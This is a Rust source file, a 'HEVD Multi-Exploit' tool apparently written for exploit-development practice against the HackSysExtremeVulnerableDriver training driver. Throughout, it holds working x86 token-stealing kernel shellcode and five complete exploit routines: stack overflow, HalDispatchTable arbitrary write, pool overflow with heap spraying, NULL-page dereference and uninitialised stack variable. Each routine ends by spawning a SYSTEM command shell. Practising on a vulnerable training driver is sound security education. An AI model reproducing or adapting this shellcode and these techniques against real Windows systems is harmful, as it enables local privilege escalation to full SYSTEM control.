#[cfg(windows)] extern crate winapi;
#[cfg(windows)] extern crate kernel32;
#[cfg(windows)] extern crate psapi;

use std::io::{stdin,stdout,Write};

use std::ptr;

extern crate byteorder;
use byteorder::{LittleEndian, WriteBytesExt};

use std::process::Command;

#[cfg(windows)]
fn open_device() -> std::os::windows::raw::HANDLE {
    use std::ffi::CString;
    use kernel32::CreateFileA;

    let hev_device;
    unsafe {
        hev_device = CreateFileA(CString::new("\\\\.\\HackSysExtremeVulnerableDriver").unwrap().as_ptr(), 0xC0000000, 0, ptr::null_mut(), 0x3, 0, ptr::null_mut());
    }
    if hev_device == ptr::null_mut() {
        panic! ("Failed opening device!");
    }

    hev_device
}

fn get_payload_token_stealing (payload_end : &[u8]) -> Vec<u8> {
    let mut token_stealing_payload : Vec<u8> = vec![
            0x60,                                       // pushad
            // Get nt!_KPCR.PcrbData.CurrentThread
            0x31, 0xc0,                                 // xor eax,eax
            0x64, 0x8b, 0x80, 0x24, 0x01, 0x00, 0x00,   // mov eax,[fs:eax+0x124]
            // Get nt!_KTHREAD.ApcState.Process
            0x8b, 0x40, 0x50,                           // mov eax,[eax+0x50]
            0x89, 0xc1,                                 // mov ecx,eax
            0xba, 0x04, 0x00, 0x00, 0x00,               // mov edx,0x4
            // lookup for the system eprocess
            0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00,         // mov eax,[eax+0xb8]
            0x2d, 0xb8, 0x00, 0x00, 0x00,               // sub eax,0xb8
            0x39, 0x90, 0xb4, 0x00, 0x00, 0x00,         // cmp [eax+0xb4],edx
            0x75, 0xed,                                 // jnz 0x1a

            // get the system token
            0x8b, 0x90, 0xf8, 0x00, 0x00, 0x00,         // mov edx,[eax+0xf8]
            // patch it in our current eprocess
            0x89, 0x91, 0xf8, 0x00, 0x00, 0x00,         // mov [ecx+0xf8],edx

            // Increment the token reference count.
            // The PointerCount gets decremented when the process exit.
            // If it arrives to 0,
            // the SYSTEM TOKEN is freed and this causes a BSoD.
            // Here we won't get that BSoD,
            // since we "properly" increase the PointerCount.
            // OBJECT_HEADER.PointerCount
            0xb9, 0x07, 0x00, 0x00, 0x00,               // mov ecx, 7
            0xf7, 0xd1,                                 // not ecx
            0x21, 0xca,                                 // and edx, ecx
            // TOKEN-0x18 = Token Object Header
            0x83, 0xea, 0x18,                           // sub edx, 0x18
            // patch PointerCount
            // set it to a high value
            0xc7, 0x02, 0x00, 0x00, 0x01, 0x00,         // mov dword ptr [edx], 0x10000

            // set NTSTATUS to 0
            0x31, 0xc0,                                 // xor eax,eax               \

            0x61,                                       // popad                     \
    ];

    for byte in payload_end.iter() {
        token_stealing_payload.push(*byte);
    }

    token_stealing_payload
}

#[cfg(windows)]
fn exploit_bof_token (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0x5d,               // pop ebp
        0xc2, 0x08, 0x00,   // ret 0x8
    ];
    let payload = get_payload_token_stealing(&payload_end);
    let mut n_read : u32 = 0;

    let len_payload = payload.len();

    println! ("\n== Stack Overflow Exploitation\n");

    unsafe {


        println! ("[+] Allocating shellcode space");
        let ptr = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode");
        RtlMoveMemory(ptr as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Preparing attack payload");
        let big_buf : [ u8; 2080 ] = [ 0x41; 2080 ];
        let mut buf : Vec<u8> = Vec::with_capacity(2084);

        for byte in big_buf.iter() {
            buf.push(*byte);
        }

        buf.write_u32::<LittleEndian>(ptr as u32).unwrap();

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Triggering vuln");
        DeviceIoControl(hev_device, 0x222003, buf.as_ptr() as *mut std::os::raw::c_void, buf.len() as u32, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        CloseHandle(hev_device);
    }

    println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
    let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
    let _ecode = child.wait()
                 .expect("failed to wait on child");
}

#[cfg(windows)]
fn lookup_base (module_name : &str) -> Option<(String,usize)> {
    let mut drivers_base : Vec<usize> = Vec::with_capacity(2048);
    let mut n_drivers = drivers_base.capacity() as u32;
    let success;

    unsafe {
        drivers_base.set_len(n_drivers as usize);
    }

    unsafe {
        success = psapi::EnumDeviceDrivers(drivers_base.as_ptr() as *mut *mut std::os::raw::c_void, 1024, &mut n_drivers);
    }
    if success == 0 {
        eprintln! ("Failed to enumerate!!!");
        return None;
    }

    for base_address in drivers_base {
        if base_address == 0 {
            continue
        }

        let mut base_name : [ u8; 1024 ] = [ 0; 1024 ];
        let driver_base_name;
        unsafe {
            driver_base_name = psapi::GetDeviceDriverBaseNameA(base_address as *mut std::os::raw::c_void, base_name.as_ptr() as *mut i8, 48);
        }
        if driver_base_name == 0 {
            eprintln! ("Unable to get driver base name!!!");
            continue;
        }

        // search for index position to ignore the remaining zeros
        let idx_zero = match base_name.iter().position(|&x| x == 0) {
            Some (v) => v,
            None => base_name.len(),
        };
        let cname = match std::str::from_utf8(&base_name[..idx_zero]) {
            Ok (v) => v,
            Err (_e) => {
                eprintln! ("Couldn't get string from str");
                continue;
            },
        };

        if cname.to_lowercase() == module_name.to_string().to_lowercase()
            || cname.to_lowercase().contains(module_name.to_string().to_lowercase().as_str()) {
            return Some ((cname.to_string(), base_address));
        }
    }

    None
}

#[cfg(windows)]
fn write4_at (addr : u32, value : u32) {
    use kernel32::{ CloseHandle, DeviceIoControl };

    let mut buf_value : Vec<u8> = Vec::with_capacity(16);
    let mut www : Vec<u8> = Vec::with_capacity(16);
    let mut n_read : u32 = 0;

    buf_value.write_u32::<LittleEndian>(value).unwrap();

    www.write_u32::<LittleEndian>(buf_value.as_ptr() as u32).unwrap();
    www.write_u32::<LittleEndian>(addr).unwrap();

    let hev_device = open_device();

    println! ("-> Writing 0x{:x} to 0x{:x}", value, addr);
    unsafe {
        DeviceIoControl(hev_device,
                        0x22200b,
                        www.as_ptr() as *mut std::os::raw::c_void,
                        www.len() as u32,
                        ptr::null_mut(),
                        0,
                        &mut n_read,
                        ptr::null_mut());

        CloseHandle(hev_device);
    }
}

#[cfg(windows)]
fn exploit_arbitrary_write (cmd : &str) {
    use std::ffi::CString;
    use kernel32::{ GetProcAddress };
    use kernel32::{ VirtualAlloc, LoadLibraryExA };
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0x83, 0xc4, 0x24,   // add esp, byte +0x24
        0x5d,               // pop ebp
        0xc2, 0x08, 0x00,   // ret 0x8
    ];
    let payload = get_payload_token_stealing(&payload_end);

    let len_payload = payload.len();

    println! ("\n== Arbitrary Overwrite Exploitation\n");

    println! ("[+] Looking for Windows kernel base");
    let mod_ntkrnl = match lookup_base("ntkrnl") {
        Some (v) => v,
        None => panic! ("Failed resolving ntkrnl base"),
    };
    let (name_ntkrnl, base_ntkrnl) = mod_ntkrnl;
    println! ("-> kernel base               : 0x{:x}", base_ntkrnl);
    println! ("name : {} addr : 0x{:x}", name_ntkrnl, base_ntkrnl);

    let mod_hal = match lookup_base("hal") {
        Some (v) => v,
        None => panic! ("Failed resolving hal base"),
    };
    let (name_hal, base_hal) = mod_hal;
    println! ("-> HAL base                  : 0x{:x}", base_hal);
    println! ("name : {} addr : 0x{:x}", name_hal, base_hal);

    let addr_ntkrnl;
    let mut addr_hal_dispatch;
    unsafe {
        println! ("[+] Getting HalDispatchTable offset in ntkrnl");
        addr_ntkrnl = LoadLibraryExA(name_ntkrnl.as_ptr() as *const i8, ptr::null_mut(), 1);
        if addr_ntkrnl == ptr::null_mut() {
            panic! ("Unable to load ntkrnl");
        }
        println! ("-> ntkrnl base               : 0x{:x}", addr_ntkrnl as u32);

        let symbol_name = CString::new("HalDispatchTable").unwrap();
        addr_hal_dispatch = GetProcAddress(addr_ntkrnl,
                                           symbol_name.as_ptr() as *const i8);
        if addr_hal_dispatch == ptr::null_mut() {
            panic! ("Unable to load HAL");
        }
        let off_hal = addr_hal_dispatch as usize - addr_ntkrnl as usize;
        println! ("-> HalDispatchTable uaddr    : 0x{:x}", addr_hal_dispatch as u32);
        println! ("-> HalDispatchTable offset   : 0x{:x}", off_hal);

        println! ("[+] Getting HalDispatchTable kernel address");
        addr_hal_dispatch = (base_ntkrnl + off_hal) as *mut std::os::raw::c_void;
        println! ("-> HalDispatchTable addr     : 0x{:x}", addr_hal_dispatch as usize);
        println! ("-> HalDispatchTable+4 addr   : 0x{:x}", addr_hal_dispatch as usize + 4);

        println! ("[+] Resolving HaliQuerySystemInformation");
        println! ("-> Loading {}", name_hal);
        let addr_hal = LoadLibraryExA(name_hal.as_ptr() as *const i8, ptr::null_mut(), 1);
        if addr_hal == ptr::null_mut() {
            panic! ("Unable to load HAL");
        }

        println! ("[+] Allocating shellcode space");
        let addr_shellcode = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode to address : 0x{:x}", addr_shellcode as u64);
        RtlMoveMemory(addr_shellcode as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Patching HalDispatchTable+4 with shellcode addr");
        write4_at(addr_hal_dispatch as u32 + 4, addr_shellcode as u32);

        println! ("[+] Trigger privesc");
        let mut interval : Vec<u8> = Vec::with_capacity(16);
        interval.write_u32::<LittleEndian>(0).unwrap();
        NtQueryIntervalProfile(0x1337 as PVOID, interval.as_ptr() as ULONG_PTR);

        // XXX: dynamically resolve HaliQuerySystemInformation,
        println! ("[+] Restoring HalDispatchTable+4 with original value : 0x{:x}", base_hal as u32 + 0x278a2);
        write4_at(addr_hal_dispatch as u32 + 4, base_hal as u32 + 0x278a2);
    }

    println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
    let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
    let _ecode = child.wait()
                 .expect("failed to wait on child");
}

#[cfg(windows)]
fn pool_spray (n_handles : usize) -> Vec<std::os::windows::raw::HANDLE> {
    use kernel32::CreateEventA;
    let mut handles = Vec::with_capacity(n_handles);

    for _idx in 0..n_handles {
        let handle;
        unsafe {
            handle = CreateEventA(ptr::null_mut(), 0, 0, ptr::null_mut());
        }
        handles.push(handle);
    }

    handles
}

#[cfg(windows)]
fn pool_create_holes (handles : &[std::os::windows::raw::HANDLE], start : usize, end : usize, size : usize) -> usize {
    use kernel32::CloseHandle;

    let n_frees = size / 0x40;
    let step = 2 * n_frees;
    let mut n_holes = 0;

    let mut idx = start;
    while idx < end {
        for handle in &handles[idx..idx+n_frees] {
            unsafe {
                CloseHandle(*handle);
            }
        }

        idx += step;
        n_holes += 1
    }

    n_holes
}

#[cfg(windows)]
fn free_handles (handles : &[std::os::windows::raw::HANDLE]) {
    use kernel32::CloseHandle;

    for handle in handles {
        //println! ("Freeing {:?}", *handle);
        unsafe {
            CloseHandle(*handle);
        }
    }
}

pub enum CVoid {}
pub type CLong = i32;
pub type CUlong = u32;

pub type HANDLE = *mut CVoid;
pub type PVOID = *mut CVoid;
pub type ULONG_PTR = usize;
pub type PULONG_PTR = *mut usize;
pub type PSIZE_T = *mut ULONG_PTR;
pub type ULONG = CUlong;

pub type LONG = CLong;
pub type NTSTATUS = LONG;

#[cfg(windows)]
#[link(name="ntdll")]
extern "stdcall" {
    fn NtAllocateVirtualMemory(
        ProcessHandle   : HANDLE,
        //BaseAddress     : PVOID,
        BaseAddress     : PSIZE_T,
        ZeroBits        : ULONG_PTR,
        RegionSize      : PSIZE_T,
        AllocationType  : ULONG,
        Protect         : ULONG
    ) -> NTSTATUS;

    fn NtMapUserPhysicalPages(
        ProcessHandle   : HANDLE,
        NumberOfPages   : ULONG_PTR,
        UserPfnArray    : PULONG_PTR,
    ) -> NTSTATUS;

    fn NtQueryIntervalProfile (
        ProfileSource   : PVOID,
        Interval        : ULONG_PTR
    ) -> NTSTATUS;
}

#[cfg(windows)]
fn exploit_nonpaged_pool_overflow_token (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0xc2, 0x10, 0x00,   // ret 0x10
    ];
    let payload = get_payload_token_stealing(&payload_end);

    let mut n_read : u32 = 0;

    let len_payload = payload.len();

    println! ("\n== Non-Paged Pool Overflow Exploitation\n");

    unsafe {
        println! ("[+] Allocating shellcode space");
        let addr_shellcode = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode to address : 0x{:x}", addr_shellcode as u64);
        RtlMoveMemory(addr_shellcode as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Prepare NULL Page");
        let mut addr_landing : usize = 1;
        let mut memsize : usize = 0x1000;
        let null_page = NtAllocateVirtualMemory(0xffff_ffff as HANDLE, &mut addr_landing as PSIZE_T, 0, &mut memsize as PSIZE_T, 0x3000, 0x40);
        if null_page != 0 {
            panic! ("[-] Couldn't allocate NULL page");
        }

        println! ("-> Crafting fake OBJECT_TYPE object");

        // the callback we wanna setup
        let mut OkayToCloseProcedure : Vec<u8> = Vec::with_capacity(16);
        OkayToCloseProcedure.write_u32::<LittleEndian>(addr_shellcode as u32).unwrap();

        // insert our callback
        // offset 0x74 is our OkayToCloseProcedure callback
        // it gets call when CloseHandle() is called
        RtlMoveMemory(0x74 as *mut winapi::ctypes::c_void, OkayToCloseProcedure.as_ptr() as *const winapi::ctypes::c_void, OkayToCloseProcedure.len());

        println! ("[+] Heap Spraying Event objects");
        let handles = pool_spray(20000);

        println! ("[+] Create holes of 0x200 bytes");
        let n_holes = pool_create_holes (&handles, 10000, 15000, 0x200);
        println! ("-> Created {} holes", n_holes);

        println! ("[+] Preparing corruption buffer");
        let big_buf : [ u8; 0x1f8 ] = [ 0x41; 0x1f8 ];
        let mut buf : Vec<u8> = Vec::with_capacity(0x1f8);

        for byte in big_buf.iter() {
            buf.push(*byte);
        }

        // struct POOL_HEADER
        // event pool_header
        buf.write_u32::<LittleEndian>(0x04080040).unwrap();
        // event tag
        buf.write_u32::<LittleEndian>(0xee657645).unwrap();

        // struct OBJECT_HEADER_QUOTA_INFO
        // PagedPoolCharge
        buf.write_u32::<LittleEndian>(0).unwrap();
        // NonPagedPoolCharge
        buf.write_u32::<LittleEndian>(0x40).unwrap();
        // SecurityDescriptorCharge
        buf.write_u32::<LittleEndian>(0).unwrap();
        // SecurityDescriptorQuotaBlock
        buf.write_u32::<LittleEndian>(0).unwrap();

        // struct OBJECT_HEADER
        // PointerCount
        buf.write_u32::<LittleEndian>(1).unwrap();
        // HandleCount
        buf.write_u32::<LittleEndian>(1).unwrap();
        // Lock
        buf.write_u32::<LittleEndian>(0).unwrap();
        // TypeIndex (original value was 0xc)
        buf.write_u8(0).unwrap();

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Overflowing our buffer");
        DeviceIoControl(hev_device, 0x22200f, buf.as_ptr() as *mut std::os::raw::c_void, buf.len() as u32, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        println! ("[+] Triggering token stealing payload");
        free_handles(&handles);

        CloseHandle(hev_device);
    }

    println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
    let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
    let _ecode = child.wait()
                 .expect("failed to wait on child");
}

#[cfg(windows)]
fn alloc_null_page () -> i32 {
    let null_page;
    let mut addr : usize = 1;
    let mut size : usize = 0x1000;
    unsafe {
        null_page = NtAllocateVirtualMemory(0xffff_ffff as HANDLE, &mut addr as PSIZE_T, 0, &mut size as PSIZE_T, 0x3000, 0x40);
    }

    null_page
}

#[cfg(windows)]
fn exploit_null_deref_token (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0xc3,               // ret
    ];
    let payload = get_payload_token_stealing(&payload_end);
    let mut n_read : u32 = 0;

    let len_payload = payload.len();

    println! ("\n== NULL Dereference Exploitation\n");

    unsafe {
        println! ("[+] Allocating shellcode space");
        let addr_shellcode = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode to address : 0x{:x}", addr_shellcode as u64);
        RtlMoveMemory(addr_shellcode as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Prepare NULL Page");
        let null_page = alloc_null_page();
        if null_page != 0 {
            panic! ("[-] Couldn't allocate NULL page");
        }

        println! ("-> Inserting custom callback");

        // the callback we wanna setup
        let mut callback : Vec<u8> = Vec::with_capacity(16);
        callback.write_u32::<LittleEndian>(addr_shellcode as u32).unwrap();

        // insert our callback
        // offset 0x74 is our OkayToCloseProcedure callback
        // it gets call when CloseHandle() is called
        RtlMoveMemory(0x4 as *mut winapi::ctypes::c_void, callback.as_ptr() as *const winapi::ctypes::c_void, callback.len());

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Trigger null deref");
        println! ("-> Prepare user value");

        let mut user_value : Vec<u8> = Vec::with_capacity(16);
        user_value.write_u32::<LittleEndian>(0x1337babe as u32).unwrap();
        DeviceIoControl(hev_device, 0x22202b, user_value.as_ptr() as *mut std::os::raw::c_void, 0, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        CloseHandle(hev_device);
    }

    println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
    let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
    let _ecode = child.wait()
                 .expect("failed to wait on child");
}

#[cfg(windows)]
fn exploit_non_init_stack (cmd : &str) {
    use kernel32::{CloseHandle, VirtualAlloc, DeviceIoControl};
    use winapi::um::winnt::RtlMoveMemory;

    let payload_end : Vec<u8> = vec![
        0x31, 0xc0,         // xor eax, eax
        0xc3,               // ret
    ];
    let payload = get_payload_token_stealing(&payload_end);
    let mut n_read : u32 = 0;

    let len_payload = payload.len();

    println! ("\n== Non Initialized Stack Variable Exploitation\n");

    unsafe {
        println! ("[+] Allocating shellcode space");
        let addr_shellcode = VirtualAlloc(ptr::null_mut(), len_payload as u32, 0x3000, 0x40);
        println! ("[+] Copying shellcode to address : 0x{:x}", addr_shellcode as u64);
        RtlMoveMemory(addr_shellcode as *mut winapi::ctypes::c_void, payload.as_ptr() as *const winapi::ctypes::c_void, len_payload);

        println! ("[+] Opening device");
        let hev_device = open_device();

        println! ("[+] Prepare user value");

        let mut user_value : Vec<u8> = Vec::with_capacity(16);
        user_value.write_u32::<LittleEndian>(0xcafebabe as u32).unwrap();

        println! ("[+] Preparing non init stack");
        println! ("-> Building UserPfnArray");
        let n_pages = 1024;
        let mut user_pfn_array : Vec<u8> = Vec::with_capacity(n_pages * 4);

        for _idx in 0..n_pages {
            user_pfn_array.write_u32::<LittleEndian>(addr_shellcode as u32).unwrap();
        }

        println! ("-> Array at 0x{:x} ({} bytes)", user_pfn_array.as_ptr() as usize, user_pfn_array.len());

        println! ("-> Inserting our array on the kernel stack and then triggering the vuln");

        // call it just before the DeviceIoControl() so no intermediary userland calls can junk it
        NtMapUserPhysicalPages(ptr::null_mut(), n_pages, user_pfn_array.as_ptr() as PULONG_PTR);

        DeviceIoControl(hev_device, 0x22202f, user_value.as_ptr() as *mut std::os::raw::c_void, user_value.len() as u32, ptr::null_mut(), 0, &mut n_read, ptr::null_mut());

        CloseHandle(hev_device);
    }

    println! ("[+] NT_AUTHORITY\\SYSTEM shell incoming");
    let mut child = Command::new(cmd).spawn().expect("Failed to execute command");
    let _ecode = child.wait()
                 .expect("failed to wait on child");
}

fn raw_input (msg : &str) -> String {
    let mut user_buf = String::new();

    print! ("{}", msg);
    let _ = stdout().flush();

    stdin().read_line(&mut user_buf).expect("Did not enter a correct string");
    if let Some('\n') = user_buf.chars().next_back() {
        user_buf.pop();
    }
    if let Some('\r') = user_buf.chars().next_back() {
        user_buf.pop();
    }

    user_buf
}

fn main() {
    println! ("HEVD Multi-Exploit v0.1 by m_101\n");
    println! ("== TOKEN STEALING SHELLCODE");
    println! ("1 - Stack Overflow");
    println! ("2 - Arbitrary Over-write");
    println! ("3 - Non-Paged Pool Overflow");
    println! ("4 - NULL Dereference");
    println! ("5 - Non initialized stack\n");

    let user_buf = raw_input("Please enter a choice : ");
    let choice : u32 = match user_buf.parse() {
        Ok (v) => v,
        Err (_e) => 0x1337,
    };

    match choice {
        1 => exploit_bof_token("cmd.exe"),
        2 => exploit_arbitrary_write("cmd.exe"),
        3 => exploit_nonpaged_pool_overflow_token("cmd.exe"),
        4 => exploit_null_deref_token("cmd.exe"),
        5 => exploit_non_init_stack("cmd.exe"),
        _ => println! ("Not doing anything "),
    }
}

